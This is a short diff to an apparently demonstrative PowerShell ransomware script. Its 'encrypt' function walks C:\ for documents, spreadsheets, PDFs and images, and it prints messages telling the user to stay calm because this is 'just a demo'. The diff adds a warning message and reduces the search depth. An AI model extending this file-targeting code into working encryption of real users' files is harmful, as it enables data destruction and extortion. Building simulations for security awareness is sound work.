@@ -1,7 +1,9 @@
 function encrypt 
 {
+  Write-Host "PLEASE, wait a moment. Do not turn the computer off!`r`n";
+
   $path = 'C:\';
-  $files = Get-ChildItem -Path $path -Recurse -Depth 3 -ErrorAction SilentlyContinue | select -expand fullname;
+  $files = Get-ChildItem -Path $path -Recurse -Depth 2 -ErrorAction SilentlyContinue | select -expand fullname;
   $extensions = @('doc', 'docm', 'docx', 'xls', 'xlsx', 'ppt', 'pptx', 'pdf', 'txt', 'jpg', 'jpeg');
 
   Write-Host "WHAT YOU SEE IS JUST A DEMO - STAY CALM!!! You won't lose any of your data!";
